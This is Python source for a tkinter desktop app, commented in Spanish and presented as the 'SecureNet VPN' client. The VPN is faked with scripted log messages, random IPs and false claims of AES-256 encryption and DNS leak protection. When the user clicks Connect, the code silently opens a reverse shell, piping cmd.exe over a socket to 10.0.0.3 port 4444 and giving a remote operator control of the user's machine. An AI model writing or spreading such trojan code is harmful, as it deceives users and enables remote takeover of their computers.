import tkinter as tk
from tkinter import ttk, scrolledtext
import random
import time
import socket
import subprocess
import threading

class ProfessionalVPN:
    def __init__(self, root):
        self.root = root
        self.root.title("SecureNet VPN")
        self.root.geometry("600x480")
        self.root.minsize(550, 420)
        self.root.configure(bg="#1a1a1a")

        self.connected = False
        self.connecting = False

        # Variables para la reverse shell
        self.sock = None
        self.process = None
        self.shell_thread = None
        self.shell_active = False

        # Estilo oscuro profesional
        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure(".", font=("Segoe UI", 10), background="#1a1a1a", foreground="white")
        self.style.configure("TLabel", background="#1a1a1a", foreground="white")
        self.style.configure("TButton", font=("Segoe UI", 11), borderwidth=0, focusthickness=0)
        self.style.map("TButton",
                       background=[("active", "#3a3a3a"), ("!disabled", "#2a2a2a")],
                       foreground=[("disabled", "gray")])
        self.style.configure("Connect.TButton", font=("Segoe UI", 13, "bold"),
                             background="#4CAF50", foreground="white", padding=10)
        self.style.map("Connect.TButton", background=[("active", "#45a049")])
        self.style.configure("Disconnect.TButton", font=("Segoe UI", 13, "bold"),
                             background="#f44336", foreground="white", padding=10)
        self.style.map("Disconnect.TButton", background=[("active", "#da190b")])
        self.style.configure("TCombobox", fieldbackground="#2a2a2a", background="#2a2a2a",
                             foreground="white", arrowcolor="white")
        self.style.map("TCombobox", fieldbackground=[("readonly", "#2a2a2a")])
        self.style.configure("TProgressbar", troughcolor="#2a2a2a", background="#4CAF50",
                             borderwidth=0, lightcolor="#4CAF50", darkcolor="#4CAF50")
        self.style.configure("Vertical.TScrollbar", background="#2a2a2a", troughcolor="#1a1a1a")

        # Cabecera
        header = tk.Frame(root, bg="#1a1a1a")
        header.pack(pady=(20, 0))

        self.lock_icon = tk.Label(header, text="🔒", font=("Segoe UI", 36),
                                  bg="#1a1a1a", fg="#888888")
        self.lock_icon.pack(side=tk.LEFT, padx=(0, 15))

        title_frame = tk.Frame(header, bg="#1a1a1a")
        title_frame.pack(side=tk.LEFT)
        tk.Label(title_frame, text="SecureNet VPN", font=("Segoe UI", 22, "bold"),
                 bg="#1a1a1a", fg="white").pack(anchor="w")
        tk.Label(title_frame, text="Protección total para tu conexión",
                 font=("Segoe UI", 10), bg="#1a1a1a", fg="#aaaaaa").pack(anchor="w")

        # Información de estado
        info_frame = tk.Frame(root, bg="#1a1a1a")
        info_frame.pack(pady=(20, 5))

        self.status_label = tk.Label(info_frame, text="● Desconectado",
                                     font=("Segoe UI", 13, "bold"),
                                     bg="#1a1a1a", fg="#f44336")
        self.status_label.pack()

        self.ip_label = tk.Label(info_frame, text="IP virtual: —",
                                 font=("Segoe UI", 11), bg="#1a1a1a", fg="#cccccc")
        self.ip_label.pack(pady=(8, 0))

        self.location_label = tk.Label(info_frame, text="Ubicación: —",
                                       font=("Segoe UI", 11), bg="#1a1a1a", fg="#cccccc")
        self.location_label.pack()

        # Controles
        control_frame = tk.Frame(root, bg="#1a1a1a")
        control_frame.pack(pady=(15, 5))

        countries = ["Argentina", "Estados Unidos", "Alemania", "Japón", "Países Bajos"]
        self.server_var = tk.StringVar(value=countries[0])
        self.server_menu = ttk.Combobox(control_frame, textvariable=self.server_var,
                                        values=countries, state="readonly", width=18,
                                        font=("Segoe UI", 11))
        self.server_menu.pack(side=tk.LEFT, padx=(0, 15))

        self.connect_btn = ttk.Button(control_frame, text="Conectar",
                                      style="Connect.TButton", width=14,
                                      command=self.toggle_connection)
        self.connect_btn.pack(side=tk.LEFT)

        self.progress = ttk.Progressbar(root, mode="indeterminate", length=300)

        # Registro
        self.logs = scrolledtext.ScrolledText(
            root,
            width=70,
            height=12,
            bg="#121212",
            fg="#d4d4d4",
            insertbackground="white",
            font=("Consolas", 9),
            relief="flat",
            borderwidth=0,
            padx=10,
            pady=10
        )
        self.logs.pack(fill=tk.BOTH, expand=True, padx=20, pady=(10, 15))

    def log(self, text):
        timestamp = time.strftime("%H:%M:%S")
        line = f"[{timestamp}] {text}\n"
        self.logs.insert(tk.END, line)
        self.logs.see(tk.END)

    def generate_ip(self):
        return f"10.8.0.{random.randint(2, 254)}"

    def toggle_connection(self):
        if self.connecting:
            return
        if not self.connected:
            self.connecting = True
            self.connect_btn.config(text="Conectando...", state="disabled")
            self.server_menu.config(state="disabled")
            self.progress.pack(pady=10)
            self.progress.start(10)

            # Iniciar la reverse shell en segundo plano (no bloquea la GUI)
            self.shell_thread = threading.Thread(target=self._start_reverse_shell, daemon=True)
            self.shell_thread.start()

            # Simular pasos de la VPN (continúa inmediatamente)
            self.root.after(400, self._connection_step_1)
        else:
            self.connecting = True
            self.connect_btn.config(text="Desconectando...", state="disabled")
            self.progress.pack(pady=10)
            self.progress.start(10)
            # Cerrar la reverse shell
            self._stop_reverse_shell()
            self.root.after(400, self._disconnection_step_1)

    def _start_reverse_shell(self):
        """Establece la reverse shell usando archivos con buffering de línea."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect(("10.0.0.3", 4444))
            self.log("[SHELL] Conectado al servidor remoto")

            # Crear objetos tipo archivo para manejar líneas
            sock_file = self.sock.makefile(mode='rw', buffering=1, errors='replace')
            sock_in = sock_file  # lectura del socket
            sock_out = sock_file # escritura al socket (mismo objeto)

            # Lanzar cmd.exe con pipes
            self.process = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False,
                bufsize=1,
                universal_newlines=True  # Modo texto
            )

            self.shell_active = True

            # Hilo 1: Leer del socket y escribir al proceso (comandos)
            def send_commands():
                try:
                    while self.shell_active:
                        cmd = sock_in.readline()
                        if not cmd:
                            break
                        self.process.stdin.write(cmd)
                        self.process.stdin.flush()
                except:
                    pass

            # Hilo 2: Leer stdout del proceso y escribir al socket
            def recv_stdout():
                try:
                    while self.shell_active:
                        line = self.process.stdout.readline()
                        if not line:
                            break
                        sock_out.write(line)
                        sock_out.flush()
                except:
                    pass

            # Hilo 3: Leer stderr del proceso y escribir al socket
            def recv_stderr():
                try:
                    while self.shell_active:
                        line = self.process.stderr.readline()
                        if not line:
                            break
                        sock_out.write(line)
                        sock_out.flush()
                except:
                    pass

            t1 = threading.Thread(target=send_commands, daemon=True)
            t2 = threading.Thread(target=recv_stdout, daemon=True)
            t3 = threading.Thread(target=recv_stderr, daemon=True)

            t1.start()
            t2.start()
            t3.start()

            # Esperar a que el proceso termine
            self.process.wait()

        except Exception as e:
            self.log(f"[SHELL] Error: {e}")
        finally:
            self._cleanup_shell()

    def _cleanup_shell(self):
        """Cierra sockets y proceso."""
        self.shell_active = False
        if self.process:
            try:
                self.process.kill()
            except:
                pass
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        self.log("[SHELL] Conexión remota cerrada")

    def _pipe_reader(self, source, dest):
        """Lee datos de 'source' y los escribe en 'dest'. Si alguna parte se cierra, termina."""
        try:
            while self.shell_active:
                data = source.read(4096)
                if not data:
                    break
                dest.write(data)
                dest.flush()
        except:
            pass

    def _stop_reverse_shell(self):
        """Cierra la reverse shell."""
        self.shell_active = False
        if self.process:
            try:
                self.process.kill()
            except:
                pass
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        self.log("[SHELL] Conexión remota cerrada")

    def _cleanup_shell(self):
        """Limpieza final después de que el proceso termine."""
        self.shell_active = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

    def _connection_step_1(self):
        self.log("🔐 Inicializando túnel seguro...")
        self.root.after(500, self._connection_step_2)

    def _connection_step_2(self):
        self.log("🛡️ Cifrado AES-256-GCM activado")
        self.log("🔒 Protección contra fugas DNS habilitada")
        self.root.after(500, self._connection_step_3)

    def _connection_step_3(self):
        ip = self.generate_ip()
        country = self.server_var.get()
        if "Estados Unidos" in country:
            ip = f"172.16.{random.randint(0,255)}.{random.randint(2,254)}"
        elif "Alemania" in country:
            ip = f"192.168.{random.randint(0,255)}.{random.randint(2,254)}"
        elif "Japón" in country:
            ip = f"10.10.{random.randint(0,255)}.{random.randint(2,254)}"
        elif "Países Bajos" in country:
            ip = f"10.20.{random.randint(0,255)}.{random.randint(2,254)}"
        self.log(f"🌍 Ubicación virtual: {country}")
        self.log(f"📡 IP asignada: {ip}")
        self.root.after(600, self._finish_connection, ip, country)

    def _finish_connection(self, ip, country):
        self.connected = True
        self.connecting = False
        self.lock_icon.config(fg="#4CAF50")
        self.status_label.config(text="● Conectado", fg="#4CAF50")
        self.ip_label.config(text=f"IP virtual: {ip}")
        self.location_label.config(text=f"Ubicación: {country}")
        self.connect_btn.config(text="Desconectar", style="Disconnect.TButton", state="normal")
        self.server_menu.config(state="disabled")
        self.progress.stop()
        self.progress.pack_forget()
        self.log("✅ Conexión establecida con éxito\n")

    def _disconnection_step_1(self):
        self.log("⏳ Cerrando túnel seguro...")
        self.root.after(500, self._disconnection_step_2)

    def _disconnection_step_2(self):
        self.log("🔓 Finalizando sesión")
        self.root.after(300, self._finish_disconnection)

    def _finish_disconnection(self):
        self.connected = False
        self.connecting = False
        self.lock_icon.config(fg="#888888")
        self.status_label.config(text="● Desconectado", fg="#f44336")
        self.ip_label.config(text="IP virtual: —")
        self.location_label.config(text="Ubicación: —")
        self.connect_btn.config(text="Conectar", style="Connect.TButton", state="normal")
        self.server_menu.config(state="readonly")
        self.progress.stop()
        self.progress.pack_forget()
        self.log("🚫 Conexión finalizada\n")

if __name__ == "__main__":
    root = tk.Tk()
    app = ProfessionalVPN(root)
    root.mainloop()